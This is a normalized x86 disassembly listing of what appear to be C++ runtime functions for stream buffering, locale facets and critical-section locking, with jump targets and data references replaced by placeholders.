sub_4037f6
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp ax 0xffff
jne r-xdata
mov ecx esi
call sub_403f07
mov ax [ eax ]
pop esi
retn
mov eax 0xffff
pop esi
retn
sub_403817
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp ax 0xffff
je r-xdata
mov eax [ edi + 0x2c ]
mov eax [ eax ]
shl eax 0x1
sar eax 0x1
test eax eax
jle r-xdata
mov [ esi ] ax
inc esi
inc esi
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] eax
jge r-xdata
mov eax [ edi + 0x1c ]
mov edx [ eax ]
test edx edx
je r-xdata
test eax eax
mov ecx esi
jbe r-xdata
mov eax [ ebp + 0xc ]
add [ ebp - 0x4 ] eax
sub [ ebp + 0xc ] eax
push eax
mov ecx edi
lea esi [ esi + eax * 2 ]
call sub_403ee2
jmp r-xdata
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov bx [ edx ]
mov [ ecx ] bx
inc ecx
inc ecx
inc edx
inc edx
dec [ ebp + 0x8 ]
jne r-xdata
sub_40389e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ ebp + 0x8 ]
mov ax [ esi ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp ax 0xffff
je r-xdata
mov eax [ edi + 0x30 ]
mov eax [ eax ]
shl eax 0x1
sar eax 0x1
test eax eax
jle r-xdata
inc esi
inc esi
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] eax
jge r-xdata
mov eax [ edi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
test eax eax
mov edx esi
jbe r-xdata
mov eax [ ebp + 0xc ]
add [ ebp - 0x4 ] eax
sub [ ebp + 0xc ] eax
push eax
mov ecx edi
lea esi [ esi + eax * 2 ]
call sub_403f17
jmp r-xdata
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov bx [ edx ]
mov [ ecx ] bx
inc ecx
inc ecx
inc edx
inc edx
dec [ ebp + 0x8 ]
jne r-xdata
sub_403926
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
push 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_40304e
mov esi eax
mov eax [ ebp + 0x8 ]
push 0x6
mov edi eax
pop ecx
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x10
sub_40394a
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
push 0xffffffff
lea ecx [ ebp - 0x18 ]
call sub_40304e
mov esi eax
mov eax [ ebp + 0x8 ]
push 0x6
mov edi eax
pop ecx
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x20
sub_403979
mov eax sub_40d97f
call sub_405888
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov edi [ esi + 0x44 ]
test edi edi
je r-xdata
call sub_403f3b
lea ecx [ esi + 0x4c ]
call sub_402960
lea ecx [ esi + 0x34 ]
mov [ esi ] r--data
call sub_402960
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x1
mov ecx edi
call sub_402176
push edi
call sub_40403c
pop ecx
sub_4039de
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp di 0xffff
mov esi ecx
jne r-xdata
mov eax [ esi + 0x20 ]
xor ebx ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ax ax
jmp r-xdata
mov eax [ esi + 0x50 ]
cmp eax ebx
jne r-xdata
mov ecx [ esi + 0x30 ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ esi + 0x38 ] ebx
jne r-xdata
or ax 0xffff
jmp r-xdata
mov ecx esi
call sub_403f2b
mov [ eax ] di
mov ax di
jmp r-xdata
push [ r--data ]
mov ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] edi
push ebx
call sub_4021e7
mov ecx [ esi + 0x44 ]
push ebx
push 0x8
call sub_402fb5
mov edi [ esi + 0x44 ]
mov ecx edi
call sub_403157
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_403157
mov eax [ ebp - 0x8 ]
mov ecx [ edi + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx eax
neg eax
sbb eax eax
lea edi [ ebp - 0x10 ]
and eax ecx
push edi
mov ecx [ esi + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push ebx
mov edx [ ecx ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x40 ]
push eax
call [ edx + 0x14 ]
sub eax 0x0
je r-xdata
push eax
push edi
call sub_406738
pop ecx
cmp ax 0xffff
pop ecx
mov eax edi
jmp r-xdata
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_403157
mov edi [ ebp - 0x10 ]
sub edi [ ebx + 0x4 ]
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_403157
push [ esi + 0x50 ]
mov ebx [ ebx + 0x4 ]
push edi
push 0x1
push ebx
call sub_404dee
add esp 0x10
cmp eax edi
mov eax [ ebp + 0x8 ]
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov eax 0xffff
lea eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] eax
je r-xdata
dec eax
dec eax
jne r-xdata
jmp r-xdata
push [ esi + 0x50 ]
push [ ebp - 0x4 ]
call sub_406738
pop ecx
cmp ax 0xffff
mov eax [ ebp + 0x8 ]
pop ecx
sub_403b26
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
mov ecx [ esi + 0xc ]
cmp [ ecx ] eax
jae r-xdata
or ax 0xffff
cmp di 0xffff
je r-xdata
mov edi [ esp + 0x10 ]
cmp di 0xffff
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov ecx esi
call sub_403ef6
mov ax di
inc ax
neg ax
sbb eax eax
and eax edi
jmp r-xdata
cmp [ eax - 0x2 ] di
jne r-xdata
mov edi [ esi + 0x44 ]
mov ebx [ edi + 0x8 ]
test ebx ebx
jbe r-xdata
push eax
push edi
call sub_40685b
pop ecx
cmp ax 0xffff
pop ecx
mov eax edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
mov ecx edi
call sub_403157
mov edi [ edi + 0x4 ]
push ebx
push [ esi + 0x50 ]
push edi
call sub_403183
add esp 0xc
test al al
je r-xdata
mov eax 0xffff
jmp r-xdata
push [ r--data ]
mov ecx [ esi + 0x44 ]
push 0x0
call sub_4021e7
mov eax [ esi + 0x3c ]
mov [ esi + 0x40 ] eax
mov ax [ esp + 0x10 ]
jmp r-xdata
sub_403bdd
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
push edi
mov edi [ esi ]
mov ecx esi
call [ edi + 0x14 ]
push eax
mov ecx esi
call [ edi + 0x8 ]
pop edi
pop esi
retn
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae r-xdata
mov ax [ eax ]
pop esi
retn
sub_403c0b
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
or ax 0xffff
jmp r-xdata
mov ecx esi
call sub_403f07
mov ax [ eax ]
jmp r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x3c ] eax
push [ r--data ]
push 0x0
call sub_4021e7
push eax
call sub_406972
cmp ax 0xffff
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi + 0x44 ]
push eax
push 0x1
call sub_402fb5
mov edi [ esi + 0x44 ]
mov eax [ esi + 0x3c ]
mov ecx edi
mov [ esi + 0x40 ] eax
call sub_403157
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_403157
mov ecx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
lea edi [ ebp - 0xc ]
mov ebx [ ebx + 0x4 ]
push edi
lea edi [ ebp ]
add ecx eax
push edi
neg eax
lea edi [ ebp - 0x2 ]
sbb eax eax
push edi
lea edi [ ebp - 0x10 ]
and eax ecx
mov ecx [ esi + 0x38 ]
push edi
push eax
lea eax [ esi + 0x40 ]
mov edx [ ecx ]
push ebx
push eax
call [ edx + 0x10 ]
sub eax 0x0
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp - 0x2 ]
dec eax
je r-xdata
push [ esi + 0x50 ]
call sub_4064b8
cmp eax 0xffffffff
pop ecx
je r-xdata
dec eax
dec eax
jne r-xdata
mov eax [ esi + 0x44 ]
cmp [ eax + 0x8 ] 0x2
jb r-xdata
mov esi eax
mov ecx esi
call sub_403157
push 0x2
lea eax [ ebp - 0x2 ]
push [ esi + 0x4 ]
push eax
call sub_405ac0
add esp 0xc
sub_403d29
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
push esi
mov [ ebp - 0x8 ] eax
sub eax eax
add eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
push edi
mov edi eax
mov eax [ esi + 0x50 ]
test eax eax
mov [ ebp - 0x4 ] ecx
je r-xdata
push 0xffffffff
lea ecx [ ebp + 0xc ]
call sub_40304e
push 0x6
mov esi eax
pop ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call sub_40650b
pop ecx
test eax eax
pop ecx
jne r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x50 ]
call sub_4064e9
pop ecx
test eax eax
pop ecx
jne r-xdata
push 0x1
push edi
push [ esi + 0x50 ]
call sub_4059f8
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esi + 0x44 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp + 0xc ] 0x0
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x18 ] eax
mov eax [ esi + 0x40 ]
push 0x6
mov [ ebp + 0x1c ] eax
pop ecx
lea esi [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp + 0x1c ]
mov [ esi + 0x40 ] eax
push [ r--data ]
push 0x0
call sub_4021e7
mov eax [ ebp + 0x8 ]
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x20
sub_403dd8
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0xc ]
add ecx ecx
push ecx
push 0x0
push [ esp + 0x10 ]
push eax
call sub_406523
add esp 0x10
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop esi
retn 0x8
sub_403e98
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push 0x20
and [ esi + 0x2c ] 0x0
mov [ esi + 0x28 ] eax
call sub_404c2c
pop ecx
mov [ esi + 0x30 ] ax
mov ecx esi
call sub_40478b
cmp [ esi + 0x28 ] 0x0
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push 0x0
or al 0x4
mov ecx esi
or al 0x4
push eax
call sub_40444e
pop esi
retn 0x8
mov ecx esi
call sub_40473d
sub_403f3b
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push eax
call sub_404d71
test eax eax
pop ecx
jne r-xdata
push 0x2
push eax
mov ecx esi
call sub_403f62
mov eax esi
pop esi
retn
sub_403f62
cmp [ esp + 0x8 ] 0x1
push esi
mov esi ecx
sete al
cmp [ esp + 0xc ] 0x0
mov [ esi + 0x48 ] al
jne r-xdata
mov ecx esi
call sub_403fb8
mov eax [ esp + 0x8 ]
mov [ esi + 0x50 ] eax
mov eax [ rw-data ]
mov [ esi + 0x40 ] eax
mov eax [ rw-data ]
and [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] eax
pop esi
retn 0x8
push edi
lea edi [ esi + 0x4c ]
mov ecx edi
call sub_402960
test edi edi
je r-xdata
and [ esi + 0x44 ] 0x0
pop edi
mov ecx edi
call sub_40290c
sub_403fb8
lea edx [ ecx + 0x14 ]
lea eax [ ecx + 0x4 ]
mov [ ecx + 0x1c ] edx
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x20 ] edx
lea edx [ ecx + 0x24 ]
mov [ ecx + 0x2c ] edx
lea edx [ ecx + 0x28 ]
mov [ ecx + 0xc ] eax
lea eax [ ecx + 0x8 ]
mov [ ecx + 0x30 ] edx
xor edx edx
mov [ ecx + 0x10 ] eax
mov [ eax ] edx
mov eax [ ecx + 0x20 ]
mov [ eax ] edx
mov eax [ ecx + 0x30 ]
mov [ eax ] edx
mov eax [ ecx + 0xc ]
mov [ eax ] edx
mov eax [ ecx + 0x1c ]
mov [ eax ] edx
mov eax [ ecx + 0x2c ]
mov [ eax ] edx
retn
sub_404047
mov eax sub_40d994
call sub_405888
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_402176
mov esi r--data
push esi
call sub_404f30
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4021b2
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_4040a1
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_4058a7
pop esi
mov eax sub_40d9a8
call sub_405888
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_406b8b
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_402176
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_4020a8
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4040a1
mov eax sub_40d9a8
call sub_405888
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_406b8b
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_402176
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_4020a8
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40412f
mov eax sub_40d9bc
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402176
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_406c12
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_404188
mov eax sub_40d9d0
call sub_405888
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_406bc8
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_402176
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_4020a8
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4041e5
mov eax sub_40d9e4
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402176
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_406c12
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_404222
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_40425b
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_4058a7
push esi
mov esi ecx
call sub_4041e5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_404273
mov eax sub_40d9f8
call sub_405888
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_402176
mov esi r--data
push esi
call sub_404f30
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4021b2
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_4040a1
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_4058a7
pop esi
sub_4042cd
mov eax sub_40da0c
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402176
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_406c12
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40430a
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_404343
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_4058a7
push esi
mov esi ecx
call sub_4042cd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_40439d
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x2
mov esi ecx
pop edi
cmp eax edi
jne r-xdata
test eax eax
mov ebx rw-data
jne r-xdata
push rw-data
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
push rw-data
call [ InterlockedExchange@IAT ]
test eax eax
jne r-xdata
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] edi
jne r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
cmp eax edi
jne r-xdata
push ebx
call [ InitializeCriticalSection@IAT ]
push sub_40441b
call sub_404ceb
pop ecx
mov [ rw-data ] edi
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push ebx
mov [ rw-data ] edi
sub_40444e
mov eax sub_40da20
call sub_405888
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
and eax 0x7
mov [ ecx + 0x4 ] eax
mov ecx [ ecx + 0x8 ]
and ecx eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je r-xdata
test cl 0x4
push esi
je r-xdata
push ebx
push ebx
call sub_4058a7
test cl 0x2
mov esi r--data
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ ebp + 0xf ]
push ebx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] al
call sub_402176
push esi
call sub_404f30
pop ecx
push eax
push esi
lea ecx [ ebp - 0x1c ]
call sub_4021b2
lea eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x38 ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_4044ea
lea eax [ ebp - 0x38 ]
push r--data
push eax
mov [ ebp - 0x38 ] r--data
call sub_4058a7
pop esi
mov esi r--data
sub_4044ea
mov eax sub_40da34
call sub_405888
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_406b8b
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_402176
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_4020a8
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40456b
mov eax sub_40da48
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402176
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_406c12
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4045c4
mov eax sub_40da5c
call sub_405888
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_406bc8
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_402176
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_4020a8
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_404621
mov eax sub_40da70
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_402176
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_406c12
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40465e
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_404697
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_4058a7
push esi
mov esi ecx
call sub_404621
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_4046af
mov eax sub_40da87
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
test eax eax
jbe r-xdata
mov ecx esi
call sub_4047c3
dec [ eax + rw-data ]
mov eax [ esi + 0x24 ]
cmp [ eax + rw-data ] 0x0
jg r-xdata
lea ecx [ esi + 0x20 ]
call sub_402960
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40471b
push esi
push edi
mov edi ecx
mov esi [ edi + 0x1c ]
pop edi
pop esi
retn 0x4
push [ esi + 0x4 ]
push edi
push [ esp + 0x14 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
jmp r-xdata
test esi esi
je r-xdata
sub_40473d
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
call sub_40439d
cmp [ esi + 0x24 ] 0x8
jae r-xdata
mov eax [ esi + 0x24 ]
lea ecx [ ebp - 0x4 ]
mov [ eax * 4 + rw-data ] esi
mov esi [ esi + 0x24 ]
inc [ esi + rw-data ]
call sub_404439
pop esi
leave
retn
mov eax [ esi + 0x24 ]
mov ecx [ eax * 4 + rw-data ]
test ecx ecx
je r-xdata
cmp ecx esi
je r-xdata
inc eax
cmp eax 0x8
mov [ esi + 0x24 ] eax
jb r-xdata
sub_40478b
push esi
mov esi ecx
push edi
xor edi edi
lea ecx [ esi + 0x20 ]
cmp ecx edi
je r-xdata
push edi
push edi
mov ecx esi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] 0x201
mov [ esi + 0x10 ] 0x6
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call sub_40444e
pop edi
pop esi
retn
call sub_40290c
sub_4047c3
push esi
push edi
mov esi ecx
push 0x0
call sub_40471b
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
and [ esi + 0x18 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_40403c
test edi edi
pop ecx
mov eax edi
jne r-xdata
and [ esi + 0x1c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_40403c
test edi edi
pop ecx
mov eax edi
jne r-xdata
sub_404826
mov eax sub_40daa6
call sub_405888
push ecx
push ecx
push esi
lea ecx [ ebp - 0x10 ]
call sub_40439d
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
mov esi [ rw-data ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_404439
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x28
call sub_40527e
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
xor eax eax
push 0x0
call sub_40493a
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
push edi
push sub_4048f0
mov [ rw-data ] eax
call sub_404ceb
mov eax [ rw-data ]
mov esi r--data
push esi
mov [ eax + 0x10 ] 0x3f
mov eax [ rw-data ]
lea edi [ eax + 0x18 ]
call sub_404f30
pop ecx
pop ecx
push eax
push esi
mov ecx edi
call sub_4021b2
mov ecx [ rw-data ]
mov [ rw-data ] ecx
call sub_40293a
mov eax rw-data
pop edi
test eax eax
je r-xdata
sub_4048f0
mov eax sub_40dab8
call sub_405888
push ecx
lea ecx [ ebp - 0x10 ]
call sub_40439d
mov ecx [ rw-data ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_404439
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_402978
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_40493a
mov eax sub_40dacc
call sub_405888
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
mov cl [ ebp + 0xb ]
lea edi [ esi + 0x18 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ edi ] cl
push eax
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_402176
mov ebx r--data
push ebx
call sub_404f30
pop ecx
push eax
push ebx
mov ecx edi
call sub_4021b2
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4049ec
mov eax sub_40daf3
call sub_405888
push ecx
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_40439d
mov edi [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x2
push [ esi + 0x8 ]
call sub_406a86
pop ecx
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x10 ]
call sub_404439
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_402176
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
test edi edi
jbe r-xdata
call sub_402978
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
jmp r-xdata
sub_404ab6
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x18 ]
